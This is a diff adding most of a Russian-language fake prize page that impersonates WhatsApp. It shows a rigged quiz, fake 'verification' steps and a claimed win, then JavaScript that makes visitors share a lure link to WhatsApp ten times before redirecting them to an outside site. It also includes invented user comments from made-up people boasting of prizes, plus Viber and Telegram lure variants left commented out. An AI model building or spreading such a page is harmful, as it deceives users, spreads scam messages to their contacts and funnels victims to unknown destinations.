+            </p>
+           </div>
+           <div class="answer anses3">
+            <p>
+             Да
+            </p>
+           </div>
+           <div class="answer anses3">
+            <p>
+             Нет
+            </p>
+           </div>
+          </div>
+          <p class="calculating">
+           <img alt="" src="https://media.giphy.com/media/8DcYkij7pUxUY/giphy.gif"/>
+           Ожидание
+          </p>
+          <div class="loading">
+           <p class="load_headline">
+            Проверка результатов
+           </p>
+           <img alt="" src="https://media.giphy.com/media/3o7TKtnuHOHHUjR38Y/source.gif" style="height:50px;width:50px;"/>
+           <p class="check check1">
+            Подождите
+           </p>
+           <p class="check check2">
+            Повторных регистраций не выявлено
+           </p>
+           <p class="check check3">
+            Запись результатов
+           </p>
+          </div>
+          <div class="last_page">
+           <div class="last-up">
+            <h4 class="textlastup">
+             <center>
+              Поздравляем! Вы выиграли один из наших призов!
+              <br/>
+              Для получения приза необходимо поделиться этой записью со своими друзьями или группами в WhatsApp
+              <br>
+               <br>
+                После этого Вы незамедлительно получите свой приз
+               </br>
+              </br>
+             </center>
+            </h4>
+            <script type="text/javascript">
+             var STRONG = {
+share: 10
+};
+
+
+function incrementValue()
+{
+var value = parseInt(document.getElementById('number').value, 10);
+value = isNaN(value) ? 0 : value;
+value++;
+document.getElementById('number').value = value;
+localStorage['lastPageShare'] = value;
+var value = parseInt(document.getElementById('number').value, 10);
+if(value>= STRONG.share){
+window.location="http://p10y.site/?1121";
+return;
+}
+
+
+}
+
+function fn1(init) {
+
+STRONG.count = true;
+var value = parseInt(document.getElementById('number').value, 10);
+if(init && localStorage['lastPage'] && localStorage['lastPageShare']>=STRONG.share){
+window.location="http://p10y.site/?1121";
+return;
+}
+if(!init){value = value + 1;}
+document.querySelector('.progress').style.display = "block";
+var inicio = 100;
+var divisor = STRONG.share;
+var porsiento = inicio / divisor;
+var estatico = porsiento;
+var obtenido = parseInt(estatico * value);
+document.querySelector('.progress span').style['width'] = obtenido + "%";
+document.querySelector('.progress span').style['width'] = obtenido + "%";
+
+}
+
+function messenger() {
+// if (localStorage.mess==1 && localStorage['lastPageShare']<4) return 'whatsapp://send?text=WhatsApp раздает призы! В честь своего 10 летия -  iPhone 12 Pro, PlayStation 4, денежные призы и многое другое! Только до 26.05.2021! Успевай: https://whatsappwin.top/';
+// if (localStorage.mess==2 && localStorage['lastPageShare']<4) return 'viber://forward?text=Viber раздает призы! В честь своего 10 летия - iPhone 12 Pro, PlayStation 4, денежные призы и многое другое! Только до 26.05.2021! Успевай: https://viberwin.top/';
+// if (localStorage.mess==3 && localStorage['lastPageShare']<4) return 'tg://msg?text=Telegram раздает призы! В честь своего 10 летия -  iPhone 12 Pro, PlayStation 4, денежные призы и многое другое! Только до 26.05.2021! Успевай: https://telegram10y.top/';
+ return 'whatsapp://send?text=WhatsApp раздает призы! В честь своего 10 летия -  iPhone 12 Pro, PlayStation 4, денежные призы и многое другое! Только до 26.05.2021! Успевай: https://whatsappwin.top/';
+}
+            </script>
+            <a data-action="share/whatsapp/share" href="#" onclick="this.href=messenger();incrementValue();return true;" target="_blank">
+             <button class="btn btn-primary" onclick="fn1()" type="button">
+              Поделиться
+             </button>
+            </a>
+            <input id="number" type="hidden" value="0"/>
+            <h4 class="textlastup">
+             <center>
+              Делитесь записью, пока нижняя панель не заполнится
+             </center>
+            </h4>
+            <div class="progress">
+             <span aria-valuemax="100%" aria-valuemin="1%" aria-valuenow="1" id="progressbar" style="width: 1%; max-width: 100%;">
+             </span>
+            </div>
+           </div>
+           <hr/>
+          </div>
+         </div>
+        </div>
+       </div>
+       <br/>
+       <br/>
+       <div class="fbcoms" style="display:none;">
+        <p class="comments">
+        </p>
+        <p class="buttons">
+         <span class="like">
+          Лайк
+         </span>
+         ·
+         <span>
+          Комментарий
+         </span>
+         ·
+         <span>
+          Поделиться
+         </span>
+         ·
+         <span>
+          Удалить
+         </span>
+        </p>
+        <p class="totlikes" style="background-size: 2.8%;">
+         <span id="youand">
+         </span>
+         <span class="fbblue">
+          12,820 other
+         </span>
+         like this
+        </p>
+        <p class="viewmore clearfix">
+         <span class="left">
+          Больше
+         </span>
+         <span class="right">
+          6 из 220
+         </span>
+         <br/>
+        </p>
+        <div class="item hidden" id="testf" style="display: none; opacity: 1;">
+         <img class="profileimg" height="50" src="https://i.imgur.com/Ekvs9dm.jpg" width="50"/>
+         <p class="comtxt" style="display: block;">
+          <span class="name">
+           Светлана Медведева
+          </span>
+          <br/>
+          Кто-то айфон TEST???
+         </p>
+         <p class="combot" style="display: block;">
+          <span class="ago">
+           Только что
+          </span>
+          ·
+          <span class="fblike">
+           Like
+          </span>
+         </p>
+        </div>
+        <div class="item hidden" id="fb8" style="display: none; opacity: 1;">
+         <img class="profileimg" height="50" src="https://i.imgur.com/Ekvs9dm.jpg" width="50"/>
+         <p class="comtxt" style="display: block;">
+          <span class="name">
+           Светлана Медведева
+          </span>
+          <br/>
+          Кто-то айфон выиграл???
+         </p>
+         <p class="combot" style="display: block;">
+          <span class="ago">
+           Только что
+          </span>
+          ·
+          <span class="fblike">
+           Like
+          </span>
+         </p>
+        </div>
+        <div class="item hidden" id="fb7" style="display: none; opacity: 1;">
+         <img class="profileimg" height="50" src="https://i.imgur.com/H1PK97D.jpg" width="50"/>
+         <p class="comtxt" style="display: block;">
+          <span class="name">
+           Валентина Петрова
+          </span>
+          <br/>
+          Большое спасибо, пополнили телефон))
+         </p>
+         <p class="combot" style="display: block;">
+          <span class="ago">
+           Только что
+          </span>
+          ·
+          <span class="fblike">
+           Like
+          </span>
+         </p>
+        </div>
+        <div class="item hidden" id="fb6" style="display: none; opacity: 1;">
+         <img class="profileimg" height="50" src="https://i.imgur.com/sG6QX5Q.jpg" width="50"/>
+         <p class="comtxt" style="display: block;">
+          <span class="name">
+           Ксюша Мутьева
+          </span>
+          <br/>
+          Ктото чтонибудь выиграл?
+         </p>
+         <p class="combot" style="display: block;">
+          <span class="ago">
+           Только что
+          </span>
+          ·
+          <span class="fblike">
+           Like
+          </span>
+         </p>
+        </div>
+        <div class="item hidden" id="fb5" style="display: none; opacity: 1;">
+         <img class="profileimg" height="50" src="https://i.imgur.com/N42335a.jpg" width="50"/>
+         <p class="comtxt" style="display: block;">
+          <span class="name">
+           Евгений Топалов
+          </span>
+          <br/>
+          Ради этой акции специально скачал ватсап по совету друзей))) спасибо!
+         </p>
+         <p class="combot" style="display: block;">
+          <span class="ago">
+           Только что
+          </span>
+          ·
+          <span class="fblike">
+           Like
+          </span>
+         </p>
+        </div>
+        <div class="item hidden" id="fb4" style="display: none; opacity: 1;">
+         <img class="profileimg" height="50" src="https://i.imgur.com/fnf8kzy.jpg" width="50"/>
+         <p class="comtxt" style="display: block;">
+          <span class="name">
+           Вова Титов
+          </span>
+          <br/>
+          Выиграл плейстейшн!!! до сих пор не верится!
+         </p>
+         <p class="combot" style="display: block;">
+          <span class="ago">
+           Только что
+          </span>
+          ·
+          <span class="fblike">
+           Like
+          </span>
+         </p>
+        </div>
+        <div class="item">
+         <img class="profileimg" height="50" src="https://i.imgur.com/uCFAfIp.jpg" width="50"/>
+         <p class="comtxt">
+          <span class="name">
+           Сергей Светлаков
+          </span>
+          <br/>
+          Ееееее, спасибо))
+         </p>
+         <p class="combot">
+          <span class="ago">
+           19 минут назад
+          </span>
+          ·
+          <span class="fblike">
+           Like
+           <span class="likes totlikes">
+            112
+           </span>
+          </span>
+         </p>
+        </div>
+       </div>
+       <br/>
+      </br>
+     </div>
+    </div>
+    <!-- survey -->
+   </div>
+   <!-- content-inner -->
+  </center>
+ </body>
+</html>
+<!-- content -->
+<script src="//www.gstatic.com/firebasejs/3.6.8/firebase.js" type="text/javascript">
+</script>
+<script src="/firebase_subscribe.js">
+</script>
